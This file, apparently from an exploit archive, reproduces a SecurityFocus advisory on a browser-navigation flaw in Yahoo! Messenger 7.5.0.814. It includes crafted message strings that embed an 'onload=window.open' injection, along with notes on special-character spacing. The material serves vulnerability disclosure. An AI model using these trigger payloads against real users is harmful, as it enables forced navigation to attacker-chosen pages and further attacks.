@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/19211/info
+
+Yahoo! Messenger is prone to a browser-navigation vulnerability that may permit a remote attacker to open a browser window on the victim user's computer to an arbitrary page.
+
+This issue occurs because the application fails to sanitize malicious messages.
+
+An attacker may be able to exploit this issue to execute a web browser and load an arbitrary web page. This may lead to other attacks.
+
+This issue affects version 7.5.0.814; other versions may also be vulnerable.
+
+The following examples are sufficient to trigger this issue:
+
+:+)-(%/?#()(=(/;_@#~$(@;+?/(?#@@*-)?@+#@;?(msg:---------------------------------------------<embed
+onload=window.open('http:\\\\google.com/')>helomsg
+
+:+)-(%/?#()(=(/;_@#~$(@;+?/(?#@@*-)?@+#@;?(msg:---------------------------------------------<embed
+onload=window.open('http:\\\\google.com/')>helomsg
+:+)-(%/?#()(=(/;_@#~$(@;+?/(?#@@*-)?@+#@;?(
+
+Note: "helomsg :" this space must be created with
+alt+0160 and this "s: " with a space.
